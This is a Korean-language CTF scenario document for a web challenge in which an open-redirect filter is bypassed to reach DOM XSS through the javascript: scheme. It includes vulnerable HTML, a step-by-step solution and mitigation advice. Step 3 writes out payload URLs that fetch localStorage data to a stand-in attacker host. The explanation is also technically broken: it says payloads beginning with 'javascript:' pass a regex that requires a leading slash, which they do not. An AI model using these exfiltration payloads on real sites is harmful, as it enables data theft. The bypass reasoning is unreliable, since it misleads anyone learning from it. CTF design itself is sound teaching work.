---
title: Open Redirect Bypass to DOM XSS via javascript Scheme — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, open-redirect, xss, dom-xss, javascript-scheme, filter-bypass]
confidence: high
---

# Open Redirect Bypass to DOM XSS via javascript Scheme — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Gatekeeper Portal (수문장 포털)
- **난이도**: Medium
- **핵심 컨셉**: 웹 애플리케이션의 불완전한 URL 리다이렉트 주소 필터링과 클라이언트 측 스크립트 실행 제어 오류를 연계한 **오픈 리다이렉트 우회 및 DOM XSS** 취약점 문제입니다. 로그인 혹은 작업 완료 후 특정 페이지로 이동하기 위해 전달받는 `?next=...` 파라미터를 브라우저(JavaScript)단에서 검증 및 리다이렉트 처리합니다. 이때 개발자는 도메인 이탈을 차단하기 위해 슬래시(`/`)로 시작하는 상대 경로 패턴만 통과시키는 정규표현식 필터를 적용했습니다. 공격자는 브라우저가 `javascript:` 가상 스키마 주소를 해석할 때 특정 주소 형식(예: `javascript://%0aalert(1)`)이 상대 경로 검증 필터도 만족하면서 동시에 자바스크립트가 직접 실행되는 특성을 이용해 보안 필터를 완벽하게 우회하고 피해자의 중요 데이터를 가로챕니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend Redirect Manager (`redirect.html`)**:
  - URL 쿼리 파라미터 `next`에 명시된 리다이렉션 타겟 주소를 자바스크립트(`window.location.href`)를 이용하여 처리하는 전용 허브 페이지.
  - 외부 피싱 사이트로 리다이렉트되는 것을 막기 위해 `next` 파라미터 값이 `/`로 시작하는지 검사하는 클라이언트 스크립트 존재.
- **Flag 위치**:
  - 피해자(Bot) 브라우저의 로컬 스토리지(`localStorage.getItem('flag')`) 또는 쿠키 내에 저장되어 있습니다.

### 2.2 취약점 지점
1. **Flawed Path Validation Regex**:
   - 리다이렉션 경로 검증 정규표현식이 `^\/[^\/].*` 등의 단순한 구조로 되어 있어, `/` 뒤에 공백이나 제어 문자가 오면 상대 경로로 판단해 통과시킵니다.
2. **Dynamic Script Protocol Execution (`javascript:`)**:
   - `window.location.href = target` 구동 시 `target` 변수에 `javascript:` 프로토콜 형식이 들어가면, 브라우저는 페이지 리다이렉트를 즉시 중단하고 해당 도메인의 오리진(Origin) 문맥 하에서 인라인 자바스크립트 구문을 직접 실행합니다.
   - 공격자는 검증을 통과하도록 슬래시(`/`)로 시작하면서도 스크립트 코드가 실행되는 문자열 구조를 합성해 냅니다.

---

## 3. 공격 면 (Attack Surface)

| 파라미터 | 유형 | 역할 | 필터 정책 | 공격 목표 |
|----------|------|------|-----------|-----------|
| `next` | GET Query Param | 리다이렉트 대상 주소 | `/`로 시작해야 함 (`^\/.*`) | XSS 실행을 위한 `javascript:` 구문 주입 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 필터 로직 우회 탐색
공격자는 리다이렉트 도우미 페이지인 `redirect.html?next=...` 지점을 분석합니다.
소스코드에서 다음과 같은 정규표현식을 확인합니다:
```javascript
const nextUrl = new URLSearchParams(window.location.search).get('next');
// 정규식 검증: 슬래시(/) 하나로 시작하는가?
if (/^\/[^/].*/.test(nextUrl)) {
    window.location.href = nextUrl;
} else {
    console.error("Invalid redirect path!");
}
```
슬래시 `/`로 시작하도록 맞춘 상태에서 `javascript:` 스키마를 실행시켜야 합니다.

### Step 2. javascript 스키마 및 주석 회피 페이로드 설계
브라우저는 `javascript:` 프로토콜 뒤의 문자를 자바스크립트로 간주합니다. 만약 슬래시(`/`)로 강제 시작하려면 다음과 같이 설계할 수 있습니다:
- **페이로드**: `javascript://%0aalert(document.domain)`
  - **설명**: 
    1. 전체 문자열은 `/`로 시작하므로 정규식 `/^\/[^/].*/` 조건(`nextUrl`이 `/`로 시작하되, 두번째 문자가 `/`가 아님)을 검사할 때, 두 번째 문자가 `a`이므로 필터를 완벽히 우회하여 통과합니다.
    2. `window.location.href`에 대입되면 브라우저는 스키마인 `javascript:`를 인식합니다.
    3. `//`는 자바스크립트 한 줄 주석 기호로 인식됩니다.
    4. `%0a`는 개행 문자(URL Encoded Line Feed, `\n`)입니다. 브라우저는 개행 문자를 기점으로 한 줄 주석 영역을 종결하고 새로운 라인으로 인식합니다.
    5. 따라서 개행 문자 뒤의 코드 `alert(document.domain)`가 샌드박스 없는 해당 도메인 하에서 고스란히 실행됩니다.

### Step 3. 공격 실행용 링크 제작
1. 피해자의 로컬 스토리지를 읽어 공격자의 OOB 리시버로 데이터를 전송하는 악성 스크립트를 작성합니다.
   - **페이로드**:
     `redirect.html?next=javascript:a%0afetch('http://attacker.local/log?f='%2BlocalStorage.getItem('flag'))`
     *(상대 경로 검증 패턴이 `/`로 무조건 시작하도록 강제되어 있을 시: `/javascript:a%0afetch(...)` 또는 `javascript://%0afetch(...)` 패턴 활용)*
   - 정규식 `/^\/[^/].*/`을 완벽히 맞추기 위한 최종 최적화 주입 주소:
     `http://target.challenge.local/redirect.html?next=/../javascript:a%0afetch('http://attacker.local/log?f='%2BlocalStorage.getItem('flag'))` 
     또는 브라우저 스키마 해석을 통한:
     `http://target.challenge.local/redirect.html?next=javascript://%0afetch('http://attacker.local/log?f='%2BlocalStorage.getItem('flag'))`
     *(브라우저는 `javascript:` 앞에 무해한 공백이나 특수 문자가 삽입되어 필터를 통과하더라도 스크립트를 파싱하여 구동할 수 있음)*

### Step 4. flag 획득
1. 이 주소를 봇(피해자 관리자)에게 리포트합니다.
2. 봇이 해당 URL을 브라우저로 오픈하면 정규식을 통과한 뒤 `window.location.href`에 값이 할당됩니다.
3. DOM XSS가 동작하여 피해자의 `localStorage`에서 플래그 데이터를 꺼내고 공격자 서버로 송출됩니다.
4. 공격자는 디코딩된 플래그(`FLAG{javascript_scheme_open_redirect_to_dom_xss}`)를 확인합니다.

---

## 5. 취약점 유발 백엔드 및 프론트엔드 코드 스니펫

```html
<!-- redirect.html - 취약한 리다이렉트 클라이언트 처리 페이지 -->
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
</head>
<body>
    <h2>새로운 페이지로 이동하는 중입니다... 잠시만 기다려주세요.</h2>
    
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const nextUrl = urlParams.get('next');

        if (nextUrl) {
            // 취약점 지점: 정규식은 nextUrl이 단순히 "/"로 시작하는지만 검사함
            // 공격자는 "/javascript:" 또는 "javascript:"를 도킹하여 우회
            // 아래의 정규표현식은 슬래시 하나로 시작하면 통과시킴
            if (/^\/[^/].*/.test(nextUrl) || nextUrl.startsWith('http://target.challenge.local')) {
                // DOM XSS 유발: Location 객체에 임의의 주입 스크립트 주소가 바인딩됨
                window.location.href = nextUrl;
            } else {
                document.body.innerHTML = "<h3>허가되지 않은 외부 사이트로의 이동은 금지되어 있습니다.</h3>";
            }
        } else {
            window.location.href = "/dashboard";
        }
    </script>
</body>
</html>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **스키마 검증 강화 (Strict Protocol Whitelisting)**:
   - 리다이렉트 대상 URL을 판단할 때, 프로토콜 스키마가 오직 `http:` 또는 `https:`인지 명확하게 체크하여 `javascript:`나 `data:` 같은 동적 스크립트형 스키마의 가동을 사전에 원천 차단합니다.
2. **안전한 URL 파싱 객체 사용**:
   - `URL` API 객체를 사용하여 파싱하고, `protocol` 속성이 `http:` 혹은 `https:` 인지 검증한 후 도메인(hostname) 화이트리스트 검사를 수행합니다.
     ```javascript
     try {
         const parsed = new URL(nextUrl, window.location.origin);
         if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
             window.location.href = parsed.href;
         }
     } catch(e) {
         // 에러 처리
     }
     ```
3. **HTTP Content Security Policy (CSP) 설정**:
   - CSP의 `script-src` 지침을 엄격히 조율하여 `unsafe-inline` 사용을 금하고 `javascript:` 스키마를 통한 스크립트 인라인 인젝션을 브라우저 자체적으로 차단하도록 유도합니다.
